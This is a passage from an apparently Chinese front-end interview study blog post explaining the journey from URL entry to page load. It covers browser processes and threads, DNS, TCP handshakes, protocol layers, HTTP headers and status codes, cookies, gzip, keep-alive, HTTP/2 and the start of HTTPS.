none</code>的区别</li></ul><p>可以如下回答：</p><ul><li>普通回答，一个隐藏，但占据位置，一个隐藏，不占据位置</li><li>进一步，<code>display</code>由于隐藏后不占据位置，所以造成了dom树的改变，会引发回流，代价较大</li><li>再进一步，当一个页面某个元素经常需要切换<code>display</code>时如何优化，一般会用复合层优化，或者要求低一点用<code>absolute</code>让其脱离普通文档流也行。然后可以将话题引到普通文档流，<code>absolute</code>文档流，复合图层的区别，</li><li>再进一步可以描述下浏览器渲染原理以及复合图层和普通图层的绘制区别（复合图层单独分配资源，独立绘制，性能提升，但是不能过多，还有隐式合成等等）</li></ul><p>上面这些大概就是知识系统化后的回答，会更全面，容易由浅入深，而且一有机会就可以往更底层挖<br><a name="section-4-1"></a></p><h3 id="前端向知识的重点"><a href="#前端向知识的重点" class="headerlink" title="前端向知识的重点"></a>前端向知识的重点</h3><p><strong>此部分的内容是站在个人视角分析的，并不是说就一定是正确答案</strong><br />首先明确，计算机方面的知识是可以无穷无尽的挖的，而本文的重点是梳理<strong>前端向</strong>的重点知识<br />对于<strong>前端向</strong>（这里可能没有提到<code>node.js</code>之类的，更多的是指客户端前端），这里将知识点按重要程度划分成以下几大类：</p><ul><li>核心知识，必须掌握的，也是最基础的，譬如浏览器模型，渲染原理，JS解析过程，JS运行机制等，作为骨架来承载知识体系</li><li>重点知识，往往每一块都是一个知识点，而且这些知识点都很重要，譬如http相关，web安全相关，跨域处理等</li><li>拓展知识，这一块可能更多的是了解，稍微实践过，但是认识上可能没有上面那么深刻，譬如五层因特网协议栈，hybrid模式，移动原生开发，后台相关等等（当然，在不同领域，可能有某些知识就上升到重点知识层次了，譬如hybrid开发时，懂原生开发是很重要的）</li></ul><p>为什么要按上面这种方式划分？<br />这大概与个人的技术成长有关。<br />记得最开始学前端知识时，是一点一点的积累，一个知识点一个知识点的攻克。<br />就这样，虽然在很长一段时间内积累了不少的知识，但是，总是无法将它串联到一起。每次梳理时都是很分散的，无法保持思路连贯性。<br />直到后来，在将浏览器渲染原理、JS运行机制、JS引擎解析流程梳理一遍后，感觉就跟打通了任督二脉一样，有了一个整体的架构，以前的知识点都连贯起来了。<br />梳理出了一个知识体系，以后就算再学新的知识，也会尽量往这个体系上靠拢，环环相扣，更容易理解，也更不容易遗忘<br><a name="section-5"></a></p><h2 id="梳理主干流程"><a href="#梳理主干流程" class="headerlink" title="梳理主干流程"></a>梳理主干流程</h2><p>回到这道题上，如何回答呢？先梳理一个骨架<br />知识体系中，最重要的是骨架，脉络。有了骨架后，才方便填充细节。所以，先梳理下主干流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 从浏览器接收url到开启网络请求线程（这一部分可以展开浏览器的机制以及进程与线程之间的关系）</span><br><span class="line">2. 开启网络线程到发出一个完整的http请求（这一部分涉及到dns查询，tcp/ip请求，五层因特网协议栈等知识）</span><br><span class="line">3. 从服务器接收到请求到对应后台接收到请求（这一部分可能涉及到负载均衡，安全拦截以及后台内部的处理等等）</span><br><span class="line">4. 后台和前台的http交互（这一部分包括http头部、响应码、报文结构、cookie等知识，可以提下静态资源的cookie优化，以及编码解码，如gzip压缩等）</span><br><span class="line">5. 单独拎出来的缓存问题，http的缓存（这部分包括http缓存头部，etag，catch-control等）</span><br><span class="line">6. 浏览器接收到http数据包后的解析流程（解析html-词法分析然后解析成dom树、解析css生成css规则树、合并成render树，然后layout、painting渲染、复合图层的合成、GPU绘制、外链资源的处理、loaded和domcontentloaded等）</span><br><span class="line">7. CSS的可视化格式模型（元素的渲染规则，如包含块，控制框，BFC，IFC等概念）</span><br><span class="line">8. JS引擎解析过程（JS的解释阶段，预处理阶段，执行阶段生成执行上下文，VO，作用域链、回收机制等等）</span><br><span class="line">9. 其它（可以拓展不同的知识模块，如跨域，web安全，hybrid模式等等内容）</span><br></pre></td></tr></table></figure><p>梳理出主干骨架，然后就需要往骨架上填充细节内容<br><a name="section-6"></a></p><h2 id="从浏览器接收url到开启网络请求线程"><a href="#从浏览器接收url到开启网络请求线程" class="headerlink" title="从浏览器接收url到开启网络请求线程"></a>从浏览器接收url到开启网络请求线程</h2><p>这一部分展开的内容是：浏览器进程&#x2F;线程模型，JS的运行机制<br><a name="section-6-1"></a></p><h3 id="多进程的浏览器"><a href="#多进程的浏览器" class="headerlink" title="多进程的浏览器"></a>多进程的浏览器</h3><p>浏览器是多进程的，有一个主控进程，以及每一个tab页面都会新开一个进程（某些情况下多个tab会合并进程）<br />进程可能包括主控进程，插件进程，GPU，tab页（浏览器内核）等等</p><ul><li>Browser进程：浏览器的主进程（负责协调、主控），只有一个</li><li>第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建</li><li>GPU进程：最多一个，用于3D绘制</li><li>浏览器渲染进程（内核）：默认每个Tab页面一个进程，互不影响，控制页面渲染，脚本执行，事件处理等（有时候会优化，如多个空白tab会合并成一个进程）</li></ul><p>如下图：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596828180-d5b4f0a9-fafc-4381-a27e-831c7edb58ab.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596828180-d5b4f0a9-fafc-4381-a27e-831c7edb58ab.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-6-2"></a></p><h3 id="多线程的浏览器内核"><a href="#多线程的浏览器内核" class="headerlink" title="多线程的浏览器内核"></a>多线程的浏览器内核</h3><p>每一个tab页面可以看作是浏览器内核进程，然后这个进程是多线程的，它有几大类子线程</p><ul><li>GUI线程</li><li>JS引擎线程</li><li>事件触发线程</li><li>定时器线程</li><li>网络请求线程</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596833651-e63a1e70-79f0-400c-8d54-6e5548d39d9e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596833651-e63a1e70-79f0-400c-8d54-6e5548d39d9e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />可以看到，里面的JS引擎是内核进程中的一个线程，这也是为什么常说JS引擎是单线程的<br><a name="section-6-3"></a></p><h3 id="解析URL"><a href="#解析URL" class="headerlink" title="解析URL"></a>解析URL</h3><p>输入URL后，会进行解析（URL的本质就是统一资源定位符）<br />URL一般包括几大部分：</p><ul><li><code>protocol</code>，协议头，譬如有http，ftp等</li><li><code>host</code>，主机域名或IP地址</li><li><code>port</code>，端口号</li><li><code>path</code>，目录路径</li><li><code>query</code>，即查询参数</li><li><code>fragment</code>，即<code>#</code>后的hash值，一般用来定位到某个位置<br><a name="section-6-4"></a></li></ul><h3 id="网络请求都是单独的线程"><a href="#网络请求都是单独的线程" class="headerlink" title="网络请求都是单独的线程"></a>网络请求都是单独的线程</h3><p>每次网络请求时都需要开辟单独的线程进行，譬如如果URL解析到http协议，就会新建一个网络线程去处理资源下载<br />因此浏览器会根据解析出得协议，开辟一个网络线程，前往请求资源（这里，暂时理解为是浏览器内核开辟的，如有错误，后续修复）<br><a name="section-6-5"></a></p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>由于篇幅关系，这里就大概介绍一个主干流程，关于浏览器的进程机制，更多可以参考以前总结的一篇文章（因为内容实在过多，里面包括JS运行机制，进程线程的详解）<br /><a href="https://segmentfault.com/a/1190000012925872">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a><br><a name="section-7"></a></p><h2 id="开启网络线程到发出一个完整的http请求"><a href="#开启网络线程到发出一个完整的http请求" class="headerlink" title="开启网络线程到发出一个完整的http请求"></a>开启网络线程到发出一个完整的http请求</h2><p>这一部分主要内容包括：<code>dns</code>查询，<code>tcp/ip</code>请求构建，<code>五层因特网协议栈</code>等等<br />仍然是先梳理主干，有些详细的过程不展开（因为展开的话内容过多）<br><a name="section-7-1"></a></p><h3 id="DNS查询得到IP"><a href="#DNS查询得到IP" class="headerlink" title="DNS查询得到IP"></a>DNS查询得到IP</h3><p>如果输入的是域名，需要进行dns解析成IP，大致流程：</p><ul><li>如果浏览器有缓存，直接使用浏览器缓存，否则使用本机缓存，再没有的话就是用host</li><li>如果本地没有，就向dns域名服务器查询（当然，中间可能还会经过路由，也有缓存等），查询到对应的IP</li></ul><p>注意，域名查询时有可能是经过了CDN调度器的（如果有cdn存储功能的话）<br />而且，需要知道dns解析是很耗时的，因此如果解析域名过多，会让首屏加载变得过慢，可以考虑<code>dns-prefetch</code>优化<br />这一块可以深入展开，具体请去网上搜索，这里就不占篇幅了（网上可以看到很详细的解答）<br><a name="section-7-2"></a></p><h3 id="tcp-x2F-ip请求"><a href="#tcp-x2F-ip请求" class="headerlink" title="tcp&#x2F;ip请求"></a>tcp&#x2F;ip请求</h3><p>http的本质就是<code>tcp/ip</code>请求<br />需要了解3次握手规则建立连接以及断开连接时的四次挥手<br />tcp将http长报文划分为短报文，通过三次握手与服务端建立连接，进行可靠传输<br /><strong>三次握手的步骤：（抽象派）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：hello，你是server么？</span><br><span class="line">服务端：hello，我是server，你是client么</span><br><span class="line">客户端：yes，我是client</span><br></pre></td></tr></table></figure><p>建立连接成功后，接下来就正式传输数据<br />然后，待到断开连接时，需要进行四次挥手（因为是全双工的，所以需要四次挥手）<br /><strong>四次挥手的步骤：（抽象派）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主动方：我已经关闭了向你那边的主动通道了，只能被动接收了</span><br><span class="line">被动方：收到通道关闭的信息</span><br><span class="line">被动方：那我也告诉你，我这边向你的主动通道也关闭了</span><br><span class="line">主动方：最后收到数据，之后双方无法通信</span><br></pre></td></tr></table></figure><p><strong>tcp&#x2F;ip的并发限制</strong><br />浏览器对同一域名下并发的tcp连接是有限制的（2-10个不等）<br />而且在http1.0中往往一个资源下载就需要对应一个tcp&#x2F;ip请求<br />所以针对这个瓶颈，又出现了很多的资源优化方案<br /><strong>get和post的区别</strong><br />get和post虽然本质都是tcp&#x2F;ip，但两者除了在http层面外，在tcp&#x2F;ip层面也有区别。<br />get会产生一个tcp数据包，post两个<br />具体就是：</p><ul><li>get请求时，浏览器会把<code>headers</code>和<code>data</code>一起发送出去，服务器响应200（返回数据），</li><li>post请求时，浏览器先发送<code>headers</code>，服务器响应<code>100 continue</code>， 浏览器再发送<code>data</code>，服务器响应200（返回数据）。</li></ul><p>再说一点，这里的区别是<code>specification</code>（规范）层面，而不是<code>implementation</code>（对规范的实现）<br><a name="section-7-3"></a></p><h3 id="五层因特网协议栈"><a href="#五层因特网协议栈" class="headerlink" title="五层因特网协议栈"></a>五层因特网协议栈</h3><p>其实这个概念挺难记全的，记不全没关系，但是要有一个整体概念<br />其实就是一个概念： <strong>从客户端发出http请求到服务器接收，中间会经过一系列的流程。</strong><br />简括就是：<br /><strong>从应用层的发送http请求，到传输层通过三次握手建立tcp&#x2F;ip连接，再到网络层的ip寻址，再到数据链路层的封装成帧，最后到物理层的利用物理介质传输。</strong><br />当然，服务端的接收就是反过来的步骤<br />五层因特网协议栈其实就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.应用层(dns,http) DNS解析成IP并发送http请求</span><br><span class="line">2.传输层(tcp,udp) 建立tcp连接（三次握手）</span><br><span class="line">3.网络层(IP,ARP) IP寻址</span><br><span class="line">4.数据链路层(PPP) 封装成帧</span><br><span class="line">5.物理层(利用物理介质传输比特流) 物理传输（然后传输的时候通过双绞线，电磁波等各种介质）</span><br></pre></td></tr></table></figure><p>当然，其实也有一个完整的OSI七层框架，与之相比，多了会话层、表示层。<br />OSI七层框架：<code>物理层</code>、<code>数据链路层</code>、<code>网络层</code>、<code>传输层</code>、<code>会话层</code>、<code>表示层</code>、<code>应用层</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表示层：主要处理两个通信系统中交换信息的表示方式，包括数据格式交换，数据加密与解密，数据压缩与终端类型转换等</span><br><span class="line">会话层：它具体管理不同用户和进程之间的对话，如控制登陆和注销过程</span><br></pre></td></tr></table></figure><p><a name="section-8"></a></p><h2 id="从服务器接收到请求到对应后台接收到请求"><a href="#从服务器接收到请求到对应后台接收到请求" class="headerlink" title="从服务器接收到请求到对应后台接收到请求"></a>从服务器接收到请求到对应后台接收到请求</h2><p>服务端在接收到请求时，内部会进行很多的处理<br />这里由于不是专业的后端分析，所以只是简单的介绍下，不深入<br><a name="section-9"></a></p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>对于大型的项目，由于并发访问量很大，所以往往一台服务器是吃不消的，所以一般会有若干台服务器组成一个集群，然后配合反向代理实现负载均衡<br />当然了，负载均衡不止这一种实现方式，这里不深入…<br />简单的说：<br /><strong>用户发起的请求都指向调度服务器（反向代理服务器，譬如安装了nginx控制负载均衡），然后调度服务器根据实际的调度算法，分配不同的请求给对应集群中的服务器执行，然后调度器等待实际服务器的HTTP响应，并将它反馈给用户</strong><br><a name="section-10"></a></p><h2 id="后台的处理"><a href="#后台的处理" class="headerlink" title="后台的处理"></a>后台的处理</h2><p>一般后台都是部署到容器中的，所以一般为：</p><ul><li>先是容器接受到请求（如tomcat容器）</li><li>然后对应容器中的后台程序接收到请求（如java程序）</li><li>然后就是后台会有自己的统一处理，处理完后响应响应结果</li></ul><p>概括下：</p><ul><li>一般有的后端是有统一的验证的，如安全拦截，跨域验证</li><li>如果这一步不符合规则，就直接返回了相应的http报文（如拒绝请求等）</li><li>然后当验证通过后，才会进入实际的后台代码，此时是程序接收到请求，然后执行（譬如查询数据库，大量计算等等）</li><li>等程序执行完毕后，就会返回一个http响应包（一般这一步也会经过多层封装）</li><li>然后就是将这个包从后端发送到前端，完成交互<br><a name="section-11"></a></li></ul><h2 id="后台和前台的http交互"><a href="#后台和前台的http交互" class="headerlink" title="后台和前台的http交互"></a>后台和前台的http交互</h2><p>前后端交互时，http报文作为信息的载体<br />所以http是一块很重要的内容，这一部分重点介绍它<br><a name="section-11-1"></a></p><h3 id="http报文结构"><a href="#http报文结构" class="headerlink" title="http报文结构"></a>http报文结构</h3><p>报文一般包括了：<code>通用头部</code>，<code>请求/响应头部</code>，<code>请求/响应体</code><br /><strong>通用头部</strong><br />这也是开发人员见过的最多的信息，包括如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Request Url: 请求的web服务器地址</span><br><span class="line">Request Method: 请求方式</span><br><span class="line">（Get、POST、OPTIONS、PUT、HEAD、DELETE、CONNECT、TRACE）</span><br><span class="line">Status Code: 请求的返回状态码，如200代表成功</span><br><span class="line">Remote Address: 请求的远程服务器地址（会转为IP）</span><br></pre></td></tr></table></figure><p>譬如，在跨域拒绝时，可能是method为<code>options</code>，状态码为<code>404/405</code>等（当然，实际上可能的组合有很多）<br />其中，Method的话一般分为两批次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</span><br><span class="line">以及几种Additional Request Methods：PUT、DELETE、LINK、UNLINK</span><br><span class="line">HTTP1.1定义了八种请求方法：GET、POST、HEAD、OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</span><br></pre></td></tr></table></figure><p><code>HTTP 1.0</code>定义参考：<a href="https://tools.ietf.org/html/rfc1945">https://tools.ietf.org/html/rfc1945</a><br /><code>HTTP 1.1</code>定义参考：<a href="https://tools.ietf.org/html/rfc2616">https://tools.ietf.org/html/rfc2616</a><br />这里面最常用到的就是状态码，很多时候都是通过状态码来判断，如（列举几个最常见的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">200——表明该请求被成功地完成，所请求的资源发送回客户端</span><br><span class="line">304——自从上次请求后，请求的网页未修改过，请客户端使用本地缓存</span><br><span class="line">400——客户端请求有错（譬如可以是安全模块拦截）</span><br><span class="line">401——请求未经授权</span><br><span class="line">403——禁止访问（譬如可以是未登录时禁止）</span><br><span class="line">404——资源未找到</span><br><span class="line">500——服务器内部错误</span><br><span class="line">503——服务不可用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>再列举下大致不同范围状态的意义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1xx——指示信息，表示请求已接收，继续处理</span><br><span class="line">2xx——成功，表示请求已被成功接收、理解、接受</span><br><span class="line">3xx——重定向，要完成请求必须进行更进一步的操作</span><br><span class="line">4xx——客户端错误，请求有语法错误或请求无法实现</span><br><span class="line">5xx——服务器端错误，服务器未能实现合法的请求</span><br></pre></td></tr></table></figure><p>总之，当请求出错时，状态码能帮助快速定位问题，完整版本的状态可以自行去互联网搜索<br /><strong>请求&#x2F;响应头部</strong><br />请求和响应头部也是分析时常用到的<br />常用的请求头部（部分）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Accept: 接收类型，表示浏览器支持的MIME类型</span><br><span class="line">（对标服务端返回的Content-Type）</span><br><span class="line">Accept-Encoding：浏览器支持的压缩类型,如gzip等,超出类型不能接收</span><br><span class="line">Content-Type：客户端发送出去实体内容的类型</span><br><span class="line">Cache-Control: 指定请求和响应遵循的缓存机制，如no-cache</span><br><span class="line">If-Modified-Since：对应服务端的Last-Modified，用来匹配看文件是否变动，只能精确到1s之内，http1.0中</span><br><span class="line">Expires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间</span><br><span class="line">Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中</span><br><span class="line">If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中</span><br><span class="line">Cookie: 有cookie并且同域访问时会自动带上</span><br><span class="line">Connection: 当浏览器与服务器通信时对于长连接如何进行处理,如keep-alive</span><br><span class="line">Host：请求的服务器URL</span><br><span class="line">Origin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私</span><br><span class="line">Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)</span><br><span class="line">User-Agent：用户客户端的一些必要信息，如UA头部等</span><br></pre></td></tr></table></figure><p>常用的响应头部（部分）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Headers: 服务器端允许的请求Headers</span><br><span class="line">Access-Control-Allow-Methods: 服务器端允许的请求方法</span><br><span class="line">Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）</span><br><span class="line">Content-Type：服务端返回的实体内容的类型</span><br><span class="line">Date：数据从服务器发送的时间</span><br><span class="line">Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档</span><br><span class="line">Last-Modified：请求资源的最后修改时间</span><br><span class="line">Expires：应该在什么时候认为文档已经过期,从而不再缓存它</span><br><span class="line">Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效</span><br><span class="line">ETag：请求变量的实体标签的当前值</span><br><span class="line">Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端</span><br><span class="line">Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）</span><br><span class="line">Server：服务器的一些相关信息</span><br></pre></td></tr></table></figure><p>一般来说，请求头部和响应头部是匹配分析的。<br />譬如，请求头部的<code>Accept</code>要和响应头部的<code>Content-Type</code>匹配，否则会报错<br />譬如，跨域请求时，请求头部的<code>Origin</code>要匹配响应头部的<code>Access-Control-Allow-Origin</code>，否则会报跨域错误<br />譬如，在使用缓存时，请求头部的<code>If-Modified-Since</code>、<code>If-None-Match</code>分别和响应头部的<code>Last-Modified</code>、<code>ETag</code>对应<br />还有很多的分析方法，这里不一一赘述<br /><strong>请求&#x2F;响应实体</strong><br />http请求时，除了头部，还有消息实体，一般来说<br />请求实体中会将一些需要的参数都放入进入（用于post请求）。<br />譬如实体中可以放参数的序列化形式（<code>a=1&amp;b=2</code>这种），或者直接放表单对象（<code>Form Data</code>对象，上传时可以夹杂参数以及文件），等等<br />而一般响应实体中，就是放服务端需要传给客户端的内容<br />一般现在的接口请求时，实体中就是对于的信息的json格式，而像页面请求这种，里面就是直接放了一个html字符串，然后浏览器自己解析并渲染。<br /><strong>CRLF</strong><br />CRLF（Carriage-Return Line-Feed），意思是回车换行，一般作为分隔符存在<br />请求头和实体消息之间有一个CRLF分隔，响应头部和响应实体之间用一个CRLF分隔<br />一般来说（分隔符类别）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CRLF-&gt;Windows-style</span><br><span class="line">LF-&gt;Unix Style</span><br><span class="line">CR-&gt;Mac Style</span><br></pre></td></tr></table></figure><p>如下图是对某请求的http报文结构的简要分析<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596826323-37c57fdf-d8fb-4c9e-9d0c-7f035baba086.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596826323-37c57fdf-d8fb-4c9e-9d0c-7f035baba086.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-11-2"></a></p><h3 id="cookie以及优化"><a href="#cookie以及优化" class="headerlink" title="cookie以及优化"></a>cookie以及优化</h3><p>cookie是浏览器的一种本地存储方式，一般用来帮助客户端和服务端通信的，常用来进行身份校验，结合服务端的session使用。<br />场景如下（简述）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在登陆页面，用户登陆了</span><br><span class="line">此时，服务端会生成一个session，session中有对于用户的信息（如用户名、密码等）</span><br><span class="line">然后会有一个sessionid（相当于是服务端的这个session对应的key）</span><br><span class="line">然后服务端在登录页面中写入cookie，值就是:jsessionid=xxx</span><br><span class="line">然后浏览器本地就有这个cookie了，以后访问同域名下的页面时，自动带上cookie，自动检验，在有效时间内无需二次登陆。</span><br></pre></td></tr></table></figure><p>上述就是cookie的常用场景简述（当然了，实际情况下得考虑更多因素）<br />一般来说，cookie是不允许存放敏感信息的（千万不要明文存储用户名、密码），因为非常不安全，如果一定要强行存储，首先，一定要在cookie中设置<code>httponly</code>（这样就无法通过js操作了），另外可以考虑rsa等非对称加密（因为实际上，浏览器本地也是容易被攻克的，并不安全）<br />另外，由于在同域名的资源请求时，浏览器会默认带上本地的cookie，针对这种情况，在某些场景下是需要优化的。<br />譬如以下场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端在域名A下有cookie（这个可以是登陆时由服务端写入的）</span><br><span class="line">然后在域名A下有一个页面，页面中有很多依赖的静态资源（都是域名A的，譬如有20个静态资源）</span><br><span class="line">此时就有一个问题，页面加载，请求这些静态资源时，浏览器会默认带上cookie</span><br><span class="line">也就是说，这20个静态资源的http请求，每一个都得带上cookie，而实际上静态资源并不需要cookie验证</span><br><span class="line">此时就造成了较为严重的浪费，而且也降低了访问速度（因为内容更多了）</span><br></pre></td></tr></table></figure><p>当然了，针对这种场景，是有优化方案的（多域名拆分）。具体做法就是：</p><ul><li>将静态资源分组，分别放到不同的域名下（如<code>static.base.com</code>）</li><li>而<code>page.base.com</code>（页面所在域名）下请求时，是不会带上<code>static.base.com</code>域名的cookie的，所以就避免了浪费</li></ul><p>说到了多域名拆分，这里再提一个问题，那就是：</p><ul><li>在移动端，如果请求的域名数过多，会降低请求速度（因为域名整套解析流程是很耗费时间的，而且移动端一般带宽都比不上pc）</li><li>此时就需要用到一种优化方案：<code>dns-prefetch</code>（让浏览器空闲时提前解析dns域名，不过也请合理使用，勿滥用）</li></ul><p>关于cookie的交互，可以看下图总结<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596827095-d66490b9-d964-48db-8891-a9a125d6d811.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596827095-d66490b9-d964-48db-8891-a9a125d6d811.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-11-3"></a></p><h3 id="gzip压缩"><a href="#gzip压缩" class="headerlink" title="gzip压缩"></a>gzip压缩</h3><p>首先，明确<code>gzip</code>是一种压缩格式，需要浏览器支持才有效（不过一般现在浏览器都支持）， 而且gzip压缩效率很好（高达70%左右）<br />然后gzip一般是由<code>apache</code>、<code>tomcat</code>等web服务器开启<br />当然服务器除了gzip外，也还会有其它压缩格式（如deflate，没有gzip高效，且不流行）<br />所以一般只需要在服务器上开启了gzip压缩，然后之后的请求就都是基于gzip压缩格式的， 非常方便。<br><a name="section-11-4"></a></p><h3 id="长连接与短连接"><a href="#长连接与短连接" class="headerlink" title="长连接与短连接"></a>长连接与短连接</h3><p>首先看<code>tcp/ip</code>层面的定义：</p><ul><li>长连接：一个tcp&#x2F;ip连接上可以连续发送多个数据包，在tcp连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包）</li><li>短连接：通信双方有数据交互时，就建立一个tcp连接，数据发送完成后，则断开此tcp连接</li></ul><p>然后在http层面：</p><ul><li><code>http1.0</code>中，默认使用的是短连接，也就是说，浏览器没进行一次http操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接</li><li>http1.1起，默认使用长连接，使用长连接会有这一行<code>Connection: keep-alive</code>，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输http的tcp连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接</li></ul><p>注意： <strong>keep-alive不会永远保持，它有一个持续时间，一般在服务器中配置（如apache），另外长连接需要客户端和服务器都支持时才有效</strong><br><a name="section-11-5"></a></p><h3 id="http-2-0"><a href="#http-2-0" class="headerlink" title="http 2.0"></a>http 2.0</h3><p>http2.0不是https，它相当于是http的下一代规范（譬如https的请求可以是http2.0规范的）<br />然后简述下http2.0与http1.1的显著不同点：</p><ul><li>http1.1中，每请求一个资源，都是需要开启一个tcp&#x2F;ip连接的，所以对应的结果是，每一个资源对应一个tcp&#x2F;ip请求，由于tcp&#x2F;ip本身有并发数限制，所以当资源一多，速度就显著慢下来</li><li>http2.0中，一个tcp&#x2F;ip请求可以请求多个资源，也就是说，只要一次tcp&#x2F;ip请求，就可以请求若干个资源，分割成更小的帧请求，速度明显提升。</li></ul><p>所以，如果http2.0全面应用，很多http1.1中的优化方案就无需用到了（譬如打包成精灵图，静态资源多域名拆分等）<br />然后简述下http2.0的一些特性：</p><ul><li>多路复用（即一个tcp&#x2F;ip连接可以请求多个资源）</li><li>首部压缩（http头部压缩，减少体积）</li><li>二进制分帧（在应用层跟传送层之间增加了一个二进制分帧层，改进传输性能，实现低延迟和高吞吐量）</li><li>服务器端推送（服务端可以对客户端的一个请求发出多个响应，可以主动通知客户端）</li><li>请求优先级（如果流被赋予了优先级，它就会基于这个优先级来处理，由服务器决定需要多少资源来处理该请求。）<br><a name="section-11-6"></a></li></ul><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>https就是安全版本的http，譬如一些支付等操作基本都是基于https的，因为http请求的安全系数太低了。<br />简单来看，https与http的区别就是： <strong>在请求前，会建立ssl链接，确保接下来的通信都是加密的，无法被轻易截取分析</strong><br />一般来说，如果要将网站升级成https，需要后端支持（后端需要申请证书等），然后https的开销也比http要大（因为需要额外建立安全链接以及加密等），所以一般来说http2.0配合https的体验更佳（因为http2.0更快了）<br />一般来说，主要关注的就是SSL&#x2F;TLS的握手流程，如下（简述）：</p><figure class="highlight plaintext"><table><tr><td 